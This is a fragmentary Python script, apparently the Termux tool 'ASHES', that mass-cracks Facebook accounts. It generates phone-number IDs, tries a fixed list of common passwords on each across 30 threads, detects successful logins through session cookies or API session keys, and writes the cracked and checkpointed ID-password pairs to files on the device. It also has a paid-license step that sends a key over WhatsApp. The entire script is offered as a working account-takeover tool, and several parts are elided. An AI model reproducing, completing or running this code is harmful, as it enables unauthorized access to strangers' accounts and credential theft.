...
[>] Version  : 0.1
----------------------------------------------
        \033[1;95m \033[1;96m ASSALAMU ALAIKUM\033[1;97m
----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi AYUB HASAN Sir, I Need To Buy Your Paid ASHES Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
                        subprocess.check_output(["am", "start", url_wa+(tks)]);time.sleep(2)
                        print(' Run :  python ASHES.py')
                        exit()
        except ValueError:
                exit()
        except requests.exceptions.ConnectionError:
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as ASHES:     
                        clear()
                        tl = str(len(user))
                        print(' TOTAL ACCOUNT : \033[1;32m'+tl)
                        print(f'\033[1;37m CHOICE CODE ..:\033[1;32m '+code)
                        print(f'\033[1;37m \x1b[38;5;208mCHANGE YOUR APN TO GET MORE OK IDZ !!\033[1;97m')
                        linex()
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','khan1122','khan12345','khan1234','khan12','khan786','khan123','khan123456','khankhan123','786786']
                                ASHES.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [K1R0N-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ASHES=session.cookies.get_dict().keys()
                        if "c_user" in ASHES:
                                coki=session.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print('\r\r\033[1;32m [ASHES-OK] %s | %s'%(ids,pas))
                                open('/sdcard/ASHES-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASHES:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [ASHES-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ASHES-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [ASHES-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ASHES-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/ASHES-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [ASHES-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/ASHES-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [ASHES-OK] '+uid+' | '+pas+'\033[1;97m')
